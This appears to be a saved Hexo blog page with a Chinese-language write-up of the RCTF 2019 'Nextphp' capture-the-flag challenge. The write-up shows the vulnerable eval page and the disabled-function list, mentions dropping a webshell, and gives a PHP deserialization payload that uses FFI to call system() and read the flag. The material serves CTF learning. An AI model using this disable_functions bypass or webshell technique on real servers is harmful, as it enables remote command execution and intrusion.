@@ -1,0 +1,204 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Nextphp - EZzz</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[RCTF 2019]Nextphp1.源代码
+123456&amp;lt;?phpif (isset($_GET[&amp;#x27;a&amp;#x27;])) &amp;#123;    eval($_GET[&amp;#x27;a,"> 
+    
+    <link rel="alternative" href="atom.xml" title="EZzz" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="Nextphp - EZzz"/>
+    <meta name="twitter:description" content="[RCTF 2019]Nextphp1.源代码
+123456&amp;lt;?phpif (isset($_GET[&amp;#x27;a&amp;#x27;])) &amp;#123;    eval($_GET[&amp;#x27;a,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="EZzz"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="Nextphp - EZzz"/>
+    <meta property="og:description" content="[RCTF 2019]Nextphp1.源代码
+123456&amp;lt;?phpif (isset($_GET[&amp;#x27;a&amp;#x27;])) &amp;#123;    eval($_GET[&amp;#x27;a,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">EZzz</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Nextphp</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Nextphp</h1>
+        <div class="stuff">
+            <span>十二月 26, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h1><p>1.源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看phpinfo（）</p>
+<p>发现很多禁用的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions	set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl	</span><br></pre></td></tr></table></figure>
+
+<p>使用file_put_contents()写入一个a.php</p>
+<p>yijian连接获取源代码preload.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;print_r&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;1&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    //可以进行函数执行</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        //array_merge把两个数组合并为一个数组</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        </span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">	//结果输出</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        //如果$key为ret，就可以输出函数执行返回的结果</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>观察到有反序列化，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;int system(char *command);&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    //可以进行函数执行</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        //array_merge把两个数组合并为一个数组</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    //结果输出</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        //如果$key为ret，就可以输出函数执行返回的结果</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line">/*</span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入<code>$a</code>之后，进行unserialize反序列化，会找__unserialize()函数，然后执行run()函数，然后data[‘ret’]&#x3D;FFI::cdef(‘int system(char *command);’)，然后使用从C库中加载的system函数，然后return，最后执行system(‘cat &#x2F;flag | tee a.txt’)，使用tee保存cat &#x2F;flag的结果</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag | tee a.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
